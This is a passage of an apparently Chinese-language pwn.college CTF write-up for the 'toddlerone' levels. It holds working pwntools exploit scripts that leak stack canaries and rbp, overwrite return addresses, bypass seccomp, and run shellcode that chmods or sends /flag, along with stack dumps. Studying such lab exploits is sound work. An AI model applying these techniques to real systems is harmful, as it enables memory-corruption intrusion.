text_of_canary[interval:interval+<span class="hljs-number">7</span>]	<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>log.info(<span class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 第二次泄露 第一次 rbp 的地址，从而构造 ret</span><br>interval += (<span class="hljs-number">7</span> + <span class="hljs-number">16</span>) <span class="hljs-comment"># 补上canary，溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]	<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>log.info(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br>rbp_int -= ((<span class="hljs-number">0xc0</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-number">2</span> + interval)		<span class="hljs-comment"># 修正 ret，本来 sub rsp 0xb8，这里有一个push，所以加上 0x8</span><br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br><br><span class="hljs-comment"># 第三次执行 shellcode</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>log.info(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>log.info(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span>	<span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>num = <span class="hljs-number">0xE4AD9CCA285A76D6</span><br>num_addr = <span class="hljs-number">0x30</span><br>payload = shell_code + <span class="hljs-string">b&#x27;C&#x27;</span> * (interval - <span class="hljs-number">16</span> - num_addr - <span class="hljs-built_in">len</span>(shell_code)) + p64(num) + <span class="hljs-string">b&#x27;D&#x27;</span>*(num_addr - <span class="hljs-number">0x20</span>) + canary + <span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x18</span> + ret	<span class="hljs-comment"># 这里没有搞懂，为什么只有一个push rbx，但是栈上面多出来一个0x8的空间，所以 -0x20 和 * 0x18 都是为了这个服务的，.1就没这个问题了，注意具体问题具体分析</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h2>
<blockquote>
<p>这里我的失误都是对于cannary在最后的payload的偏移出错，这里就需要学会在特定位置动态调试，这里6.1没有符号，所以建议 gdb.debug(binary_paths[0],“break seccomp_load”) 对系统api进行断点，然后可以看到最后的stack来判断自己的payload是否正确</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">// 看一下栈<br>// 第一次调用challenge的栈<br>| 0x00007ffd906670d8 (rsp+0x0078) | 00 6c a8 2f 97 d6 69 68 | 0x6869d6972fa86c00 | canary<br>| 0x00007ffd906670e0 (rsp+0x0080) | 40 02 49 5b b0 55 00 00 | 0x000055b05b490240 |<br>| 0x00007ffd906670e8 (rsp+0x0088) | 10 12 49 5b b0 55 00 00 | 0x000055b05b491210 |<br>| 0x00007ffd906670f0 (rsp+0x0090) | 30 81 66 90 fd 7f 00 00 | 0x00007ffd90668130 |	rbp<br>| 0x00007ffd906670f8 (rsp+0x0098) | ed 11 49 5b b0 55 00 00 | 0x000055b05b4911ed |	ret<br>+---------------------------------+-------------------------+--------------------+<br>input = 0x7ffd906670b0	length=0x40=0xf0-0xb0，但是真实大小为0x40-0x18=0x28，40个字节<br><br>// 第一次从challenge到challenge的栈<br>| 0x00007ffd90667038 (rsp+0x0078) | 00 6c a8 2f 97 d6 69 68 | 0x6869d6972fa86c00 |<br>| 0x00007ffd90667040 (rsp+0x0080) | 40 02 49 5b b0 55 00 00 | 0x000055b05b490240 |<br>| 0x00007ffd90667048 (rsp+0x0088) | 10 12 49 5b b0 55 00 00 | 0x000055b05b491210 |<br>| 0x00007ffd90667050 (rsp+0x0090) | f0 70 66 90 fd 7f 00 00 | 0x00007ffd906670f0 |<br>| 0x00007ffd90667058 (rsp+0x0098) | b7 0f 49 5b b0 55 00 00 | 0x000055b05b490fb7 |<br>+---------------------------------+-------------------------+--------------------+<br>input = 0x7ffd90667010<br><br>// 第二次从challenge到challenge的栈<br>| 0x00007ffd90666f98 (rsp+0x0078) | 00 6c a8 2f 97 d6 69 68 | 0x6869d6972fa86c00 |<br>| 0x00007ffd90666fa0 (rsp+0x0080) | 40 02 49 5b b0 55 00 00 | 0x000055b05b490240 |<br>| 0x00007ffd90666fa8 (rsp+0x0088) | 10 12 49 5b b0 55 00 00 | 0x000055b05b491210 |<br>| 0x00007ffd90666fb0 (rsp+0x0090) | 50 70 66 90 fd 7f 00 00 | 0x00007ffd90667050 |<br>| 0x00007ffd90666fb8 (rsp+0x0098) | b7 0f 49 5b b0 55 00 00 | 0x000055b05b490fb7 |<br>+---------------------------------+-------------------------+--------------------+<br>input = 0x7ffd90666f70<br></code></pre></td></tr></table></figure>
<p>​	这里主要就是看 cannary 的地址和 seccomp。对于cannary，看 <code>fs:28h</code> 传入栈的地址得到 cannary 的位置，这里需要注意 <code>push rbx</code> 形成了干扰(这里感觉存在脏东西，不然一个 push rbx 不会形成栈上 rsp+0x80 和 rsp+0x88 这两个地方的数据)，同时由于cannary 和 buf 之间的间隔很小，所以需要选择适当的shellcode。</p>
<p>​	然后对于 seccomp，这里就是对于 <code>seccomp_rule_add(ctx, 0x7FFF0000, *((unsigned int *)v16 + i), 0)</code> 的理解， 0x7fff0000 表示设置允许的系统调用规则，后面的 v16+i 是栈上的参数，在buf的下面，也就是让你通过溢出覆盖栈上的数据选择可以使用的系统调用，这里根据使用的shellcode选择了 chmod 的系统调用，所以 v16+0 就是 0x5a(chmod的系统调用号)。这里它允许两个系统调用，其实一个就够了，另外一个应该设置为 0x1(write)，不然最后的 Goodbye! 不能打印出来，因为它使用的是 puts，底层需要使用 write 进行输出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi,rsp		</span><br><span class="hljs-string">    push 4</span><br><span class="hljs-string">    pop rsi			</span><br><span class="hljs-string">    mov al,0x5a		</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span>	<span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 0x18,这里需要先链接 ln -s /flag f</span><br><br><span class="hljs-comment">#### 第一次泄露 canary 的值 ####</span><br><span class="hljs-comment"># canary(fs:28h)被赋值到 rbp - 0x18 位置，所以cannary处于buf的起始位置0x40 - 0x18的位置，+1 覆盖 \x00 溢出</span><br>interval = <span class="hljs-number">0x40</span> - <span class="hljs-number">0x18</span> + <span class="hljs-number">1</span><br>r.sendlineafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval).encode())<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buf再次调用challenge的条件</span><br>r.sendafter(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">b&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">b&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]	<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>success(<span class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#### 第二次泄露 根据第一次challenge到challenge的 rbp 的地址，从而构造 ret ####</span><br>interval += <span class="hljs-number">7</span> + <span class="hljs-number">8</span> + <span class="hljs-number">8</span>  <span class="hljs-comment"># 补上canary和最开始push的rbx(rbx存在两个8字节的脏数据)，使之溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval).encode())<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">b&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">b&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]	<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>success(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># 修正 ret，这里是根据第一次challenge到challenge泄露的 rbp 地址计算出第二次从challenge到challenge的input地址</span><br><span class="hljs-comment"># 0x88 是每次进入challenge的 sub rsp, 88h 产生的影响，然后0x10是push rbx的16字节脏数据，0x8是cannary，然后*2就是两次进入challenge的偏移，最后得到了第二次的rbp地址，然后根据buf与rbp的偏移 interval计算出input的地址</span><br><span class="hljs-comment"># 根据 6.1 的exp来看，上面理解有误，这里0x10指代 ret和old_rbp 的大小，然后0x8指代 push rbx 的大小。对于rsp和rbp的偏移，push rbx 就是0x8大小，而这里我说有16字节的脏数据，应该是后面的程序对于栈上数据进行了更改，造成了这样的一个现象，同时那个多余的0x8字节只是对于栈上cannary和buf的地址偏移计算造成影响，对于rbp的计算无影响。这里*2就是总共有三个challenge连在一起，由第一个rbp得到第三个的buf地址。</span><br>rbp_int -= ((<span class="hljs-number">0x88</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">0x8</span>) * <span class="hljs-number">2</span> + interval)		<br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br>hex_ret = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(ret)]<br>success(<span class="hljs-string">f&quot;address of ret : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_ret)&#125;</span>&quot;</span> )<br><br><span class="hljs-comment">#### 第三次执行 shellcode ####</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>).ljust(<span class="hljs-number">24</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)	<span class="hljs-comment"># 这里补全了buf的内容，以便后面的计算</span><br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>success(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>success(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span>	<span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval).encode()) <br><span class="hljs-comment"># buf(24)+chmod(8)+write(8)+b&#x27;C&#x27;(8)+cannary+b&#x27;D&#x27;(24)+ret(8)</span><br>payload = shell_code + p32(<span class="hljs-number">0x5a</span>) + p32(<span class="hljs-number">0x1</span>) + <span class="hljs-string">b&#x27;C&#x27;</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">0x8</span> - <span class="hljs-number">0x8</span> - <span class="hljs-built_in">len</span>(shell_code))  + canary + <span class="hljs-string">b&#x27;D&#x27;</span>*(interval - <span class="hljs-number">0x8</span> - <span class="hljs-number">0x30</span>) + ret<br>r.sendafter(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-7-3"><a class="markdownIt-Anchor" href="#level-7-3"></a> level 7</h2>
<blockquote>
<p>这里存在vm虚拟机，同时禁用了open，所以通过查看打印的栈信息，通过read_memory读取输入信息，溢出覆盖返回地址，然后爆破得到相应的偏移，成功执行payload</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment"># 查看二进制代码获取的规则</span><br><span class="hljs-comment"># arg2 arg1 op  -&gt; rbp+var+2 rbp+var+1 rbp+var 这里最好动态调试，看汇编看不明白</span><br><span class="hljs-comment"># imm 0x1 add 0x8 stk 0x40 stm 0x4 ldm 0x10 cmp 0x20 jmp 0x2 sys 0x80</span><br><span class="hljs-comment"># a 0x40 b 0x1 c 0x2 d 0x10 s 0x20 i 0x4 f 0x8 </span><br><br><span class="hljs-comment"># shellcode，就是open f 和 sys_sendfile</span><br>shellcode_origin = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov al, 2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rsi, rax</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    mov rcx, 0x1000</span><br><span class="hljs-string">    mov ax, 40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 根据vm的规则设定相应的vm_op，然后通过get_ins直接获取相应的二进制数</span><br>ID = [<span class="hljs-string">b&#x27;\x01&#x27;</span>, <span class="hljs-string">b&#x27;\x02&#x27;</span>, <span class="hljs-string">b&#x27;\x04&#x27;</span>, <span class="hljs-string">b&#x27;\x08&#x27;</span>, <span class="hljs-string">b&#x27;\x10&#x27;</span>, <span class="hljs-string">b&#x27;\x20&#x27;</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>, <span class="hljs-string">b&#x27;\x80&#x27;</span>]<br>vm_op = &#123;<br>    <span class="hljs-string">&#x27;IMM&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;ADD&#x27;</span>: ID[<span class="hljs-number">3</span>],<br>    <span class="hljs-string">&#x27;STK&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;STM&#x27;</span>: ID[<span class="hljs-number">2</span>],<br>    <span class="hljs-string">&#x27;LDM&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;CMP&#x27;</span>: ID[<span class="hljs-number">5</span>],<br>    <span class="hljs-string">&#x27;JMP&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;SYS&#x27;</span>: ID[<span class="hljs-number">7</span>],<br><br>    <span class="hljs-string">&#x27;REG_A&#x27;</span>: ID[<span class="hljs-number">6</span>],<br>    <span class="hljs-string">&#x27;REG_B&#x27;</span>: ID[<span class="hljs-number">0</span>],<br>    <span class="hljs-string">&#x27;REG_C&#x27;</span>: ID[<span class="hljs-number">1</span>],<br>    <span class="hljs-string">&#x27;REG_D&#x27;</span>: ID[<span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;REG_I&#x27;</span>: ID[<span class="hljs-number">2</span>],<br><br>    <span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>: ID[<span class="hljs-number">5</span>],<br>    <span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>: ID[<span class="hljs-number">4</span>]<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ins</span>(<span class="hljs-params">op, arg1, arg2</span>):<br>    <span class="hljs-keyword">return</span> arg2 + arg1 + op<br><br>vm_code = <span class="hljs-string">b&#x27;&#x27;</span><br>offset= <span class="hljs-number">0x100</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 这里通过在栈上观察情况，write出old_rsp，然后read读取payload到内存的某个位置，通过不断爆破得到offset来使ret到payload的位置</span><br>    r = process(binary_paths)<br>    <span class="hljs-comment"># a = write(1, 0xff, 0x68)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c]</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\x68&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#对应的是rsp+0x3d8的位置，也就是这里ins[]数值自动加0x10</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_WRITE&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    <span class="hljs-comment"># a = read(0, 0xff, 0xff)[a, &amp;a1-&gt;ins[a1-&gt;b + 0x300], c] -&gt; read_memory</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_C&#x27;</span>], <span class="hljs-string">b&#x27;\xff&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_B&#x27;</span>], <span class="hljs-string">b&#x27;\xc8&#x27;</span>)<span class="hljs-comment">#这里也是+0x10，对应rsp+0x408</span><br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;IMM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>], <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    vm_code += get_ins(vm_op[<span class="hljs-string">&#x27;SYS&#x27;</span>], vm_op[<span class="hljs-string">&#x27;SYS_READ_MEM&#x27;</span>], vm_op[<span class="hljs-string">&#x27;REG_A&#x27;</span>])<br>    r.send(vm_code)<br>    r.recvuntil(<span class="hljs-string">b&#x27;write\n&#x27;</span>)<br>    <span class="hljs-comment"># 最后获取到的就是old_rsp，详细看level 8的解释</span><br>    ret = r.recv(<span class="hljs-number">0x68</span>)<br>    old_rsp = ret[-<span class="hljs-number">8</span>:]<br>    success(<span class="hljs-string">f&quot;Old RBP: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(u64(old_rsp))&#125;</span>&quot;</span>)<br>    shellcode = asm(shellcode_origin, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    <span class="hljs-comment"># 根据堆栈计算出payload的偏移，然后构造ret</span><br>    payload = shellcode + (<span class="hljs-number">0x50</span> - <span class="hljs-built_in">len</span>(shellcode)) * p8(<span class="hljs-number">0xff</span>) + p64(u64(old_rsp) - offset)<br>    r.send(payload)<br>    text = r.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> text:<br>        offset += <span class="hljs-number">8</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Offset:&quot;</span>, offset)<br>        r.close()<br>    <span class="hljs-keyword">else</span>:<br>        success(text[text.find(<span class="hljs-string">b&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<h2 id="level-8-3"><a class="markdownIt-Anchor" href="#level-8-3"></a> level 8</h2>
<blockquote>
<p>与level 7相比只是多了一个cannary</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 